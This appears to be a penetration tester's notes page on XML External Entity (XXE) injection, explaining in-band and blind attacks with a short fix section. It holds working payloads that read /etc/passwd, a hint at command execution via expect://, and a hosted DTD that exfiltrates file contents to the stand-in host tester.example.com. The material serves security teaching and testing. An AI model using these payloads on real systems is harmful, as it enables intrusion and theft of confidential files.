# XXE

XML Entity Injection is a powerful vulnerability that can allow for confidential data theft and in rare cases command execution. It was also often overlooked for a while - but now it features in the OWASP Top 10 as A4 it's a lot more well known. The issue comes about within XML parsers where external entities are processed which can allow for URIs to be loaded.
source: https://akimbocore.com/article/xxe-xml-external-entity-injection/



There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).  
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.


If you have an application which processes XML you're going to see something like this:

```xml
<?xml version='1.0' encoding='UTF-8'?> 
<todo>
<item>Buy more Toilet Roll</item>
</todo>
```

With many parsers you can modify this content and define entities. Here's a simple example with an entity defined:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE replace [<!ENTITY example "Toilet Roll"> ]>
<todo>
<item>Buy more &example;</item>
</todo>
```



Sample Payloads

```xml
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
<root>&read;</root>
```

```xml
<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]> 
<todo>
<item>Buy more &example;</item>
</todo>
```



 try "expect://id" to run commands
 
 also php code is possible (check payloadsAllTheThings)
  

# Out of Band Exploitation

It's also possible to exploit XEE out of band, meaning that if an application processes XML but does not render the output within the application it's still possible to exfiltrate confidential data. This is achieved by the vulnerable parser to forward the response to an external server.

This attack takes two steps, the first is to host a DTD on an accessible web server, something like this:

```xml
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>"> 
```
The intention of this file is to load the target file (in this example /etc/passwd) and append the result to the end of a web request to a server you can access (in this case tester.example.com). To utilise this DTD you would send a request to the vulnerable web server like the below:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://tester.example.com/xxe_file"> %pe; %param1; ]>
<foo>&external;</foo> 
```
This would cause the vulnerable application to load the remote DTD, which executes as described above. You can verify the exploit worked by checking the server logs, an initial request will be logged for the xxe_file followed shortly by a request containing the file content.

 
 ## Fixing XML External Entity Injection

In instances where XML external entities are not required for normal function of the vulnerable application, they may simply be disabled by reconfiguring the XML parser. In cases where they are required the system should be reconfigured such that the user cannot define arbitrary entities; this may be possible by simply ignoring or overwriting any supplied XML Document Type Definitions (DTD).